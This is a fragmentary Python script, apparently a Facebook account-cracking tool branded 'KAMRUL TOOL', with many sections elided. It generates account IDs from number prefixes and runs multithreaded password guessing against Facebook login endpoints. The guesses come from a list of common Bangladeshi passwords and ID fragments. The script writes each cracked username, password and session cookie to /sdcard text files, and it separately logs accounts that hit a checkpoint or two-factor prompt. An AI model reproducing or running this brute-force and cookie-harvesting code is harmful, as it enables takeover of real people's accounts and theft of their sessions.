...
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO KAMRUL TOOL\033[1;37m...!')
...
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO RJ KAMRUL TOOL...!')
...
logo=("""\033[1;37m       
    ...
    ................................                                                                                                    
\033[1;33m═══════════════════════════════════════
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  AUTHOR    : KAMRUL HASAN  \033[92;1m•
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  FACEBOOK: KAMRUL HASAN MAHI
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  JOIN GROUP  : WHATSAPP
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  VERSION    : \033[1;92m3.00
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  YOUR MIND IS YOUR BEST WEAPON:\033[1;92m 🇧🇩BOSS
\033[1;33m════════════════════════════════════════\033[1;33m""")   
def line():
	print(f'\033[1;37m-----------------------------------------------')
...
def pak():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mUSE FLIGHT MODE FOR BEST SPEED UP \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,ids[:8],ids[:7],'mimmim','fatema','jannat','sadiya','Bangla','@@@###', '123123', 'sadiya123', '304050','102030','203040','708090','i love you','FREE FIRE','free fire','bangladesh','Pubgmobile','bangla']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mKAMRUL\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [KAMRUL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KAMRUL-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/KAMRUL-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [KAMRUL-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mKAMRUL\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [KAMRUL-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				line()
				open('/sdcard/KAMRUL-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [KAMRUL-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/KAMRUL-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mKAMRUL\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				open('/sdcard/KAMRUL-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [KAMRUL-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/KAMRUL-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'user-agent': S1(),}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [KAMRUL-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/KAMRUL-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [KAMRUL-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/KAMRUL-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mKAMRUL-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mKAMRUL\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
